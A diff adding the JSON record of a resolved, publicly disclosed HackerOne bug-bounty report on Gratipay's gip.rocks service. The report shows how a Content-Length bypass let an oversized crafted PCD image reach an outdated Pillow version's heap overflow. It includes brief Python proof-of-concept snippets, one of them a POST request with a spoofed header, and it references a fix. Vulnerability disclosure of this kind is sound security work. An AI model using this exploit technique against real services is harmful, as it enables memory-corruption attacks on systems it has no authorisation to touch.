@@ -1,0 +1,125 @@
+{
+  "id": 214449,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQ0NDk=",
+  "url": "https://hackerone.com/reports/214449",
+  "title": "Content-Length restriction bypass to heap overflow in gip.rocks.",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-03-18T12:27:50.003Z",
+  "submitted_at": "2017-03-18T12:27:50.003Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "edoverflow",
+    "url": "/edoverflow",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1868,
+    "url": "https://hackerone.com/gratipay",
+    "handle": "gratipay",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Gratipay",
+      "twitter_handle": "Gratipay",
+      "website": "https://gratipay.com/",
+      "about": "Gratitude? Gratipay! The easiest way for your company to pay for open source."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": true,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-03-20T20:17:36.903Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-03-20T20:12:38.550Z",
+  "team_member_agreed_on_going_public_at": "2017-03-20T20:17:36.862Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I started playing around with a0xnirudh's [Content-Length restriction bypass](https://hackerone.com/reports/203388) and noticed that when combined with a different vulnerability  this could be leveraged to do a bit more than DoS.\n\nWe decided to open a new ticket to address this issue, since [we were already aware of the bypass](https://github.com/gratipay/gip.rocks/issues/2). a0xnirudh wrote such a good report that we decided to not close their report as a `Duplicate`.\n\n# Summary\n---\n\nI noticed that `gip.rocks` was using an outdated version (2.9.0) of the Pillow framework which is vulnerable to heap overflows. The test playoad is 788480 bytes. So the bypass allowed me to pass the payload on to the vulnerable code.\n\n~~~python\n>>> import os\n>>> os.path.getsize('payload.pcd')\n788480L\n~~~\n\n# PoC\n---\n\nVulnerable code in `www/v1.st` summarised:\n\n~~~python\n>>> from PIL import Image\n>>> image = Image.open('foo.jpg')\n>>> image.resize((foo, bar))\n~~~\n\nSummarised exploit:\n\n~~~python\n>>> from PIL import Image\n>>> image = Image.open('payload.pcd')\n>>> image.resize((128, 128))\n~~~\n\nExploit concept:\n\n~~~python\nimport requests\nr = requests.post(  'http://gip.rocks/v1', \n                    data = open('payload.pcd').read(), \n                    headers = { \n                        'Content-Type': 'image/jpeg',\n                        'Content-Length': ' ' # Insert a value smaller than 262144\n                    }\n                  )\nprint(r.status_code, r.reason)\n~~~\n\n# Fix\n---\n\nI have submitted a PR to solve the heap overflow vulnerability: https://github.com/gratipay/gip.rocks/pull/5",
+  "weakness": {
+    "id": 5,
+    "name": "Heap Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-04-19T20:12:38.589Z",
+  "allow_singular_disclosure_after": -285707637.0021128,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "delimitry",
+    "eveeez",
+    "hacklad",
+    "0xm1racle",
+    "spetr0x"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
